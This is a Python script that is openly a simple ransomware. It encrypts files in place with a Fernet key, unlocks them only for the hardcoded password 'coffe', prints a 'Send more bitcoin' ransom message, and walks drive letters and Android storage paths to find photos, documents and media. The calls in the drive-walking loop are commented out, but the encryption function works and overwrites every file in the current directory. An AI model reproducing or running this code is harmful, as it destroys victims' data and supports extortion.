import os, shutil, time, platform
from cryptography.fernet import Fernet
sles = '\\' if platform.system().lower() == 'windows' else '//'

def ecriptFun(f):
    # # Encryption Start  ===============================
    files = []

    for file in os.listdir():
        if file == "encrypt.py" or file == "thekey.key":
            continue
        if os.path.isfile(file):
            files.append(file)
        
    print(files)
    key = Fernet.generate_key()
    # print(key)

    with open("thekey.key", "wb") as thekey:
        thekey.write(key)


    
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
        print("Ok tata byby byby khatam !!!\n Your all files are encrypted. ")
    # # Encryption End ===========================================

def decryptFun():
	files = []

	for file in os.listdir():
		if file == "encrypt.py" or file == "thekey.key":
			continue
		if os.path.isfile(file):
			files.append(file)
		
	print(files)

	with open("thekey.key", "rb") as key:
		secretkey = key.read()

	user_key = "coffe"
	user_input = input("Enter the key : ")

	if (user_input == user_key):
		for file in files:
			with open(file, "rb") as thefile:
				contents = thefile.read()
			contents_decrypted = Fernet(secretkey).decrypt(contents)
			with open(file, "wb") as thefile:
				thefile.write(contents_decrypted)
			print("Congrats!, you're file are decrypted, Enjoy your coffe.")
	else:
		print("Sorry, wrorg key, Send more bitcoin !!!")

drive = [f"D:{sles}", f"E:{sles}", f"F:{sles}", f"G:{sles}", f"H:{sles}", f"M:{sles}", f"V:{sles}", f"Q:{sles}", f"Z:{sles}", f"Y:{sles}", f"W:{sles}", f"T:{sles}", f"X:{sles}", f"S:{sles}", f"U:{sles}", f"R:{sles}", f"I:{sles}", f"J:{sles}", f"K:{sles}", f"L:{sles}", f"N:{sles}", f"O:{sles}", f"P:{sles}", f"C:{sles}", f"{sles}storage/emulated/0/", f"{sles}storage/sdcard1/"]
for path in drive[0: ]:
	for root_path, dirc, files in os.walk(path):		
		for file in files:
			imageFile = [".jpg", ".jpeg", ".png"]
			for fil in imageFile[0: ]:
				if file.endswith(fil):
					f = os.path.join(root_path, file)
					# ecriptFun(f)
			documentsFile = [".doc", ".xlsx", ".xls", ".pdf", ".txt"]
			for fil in documentsFile[0: ]:
				if file.endswith(fil):
					f = os.path.join(root_path, file)
					# ecriptFun(f)
			mediaFile = [".mp3", ".mp4", ".avi", ".mkv"]
			for fil in mediaFile[0: ]:
				if file.endswith(fil):
					f = os.path.join(root_path, file)
					# ecriptFun(f)
			
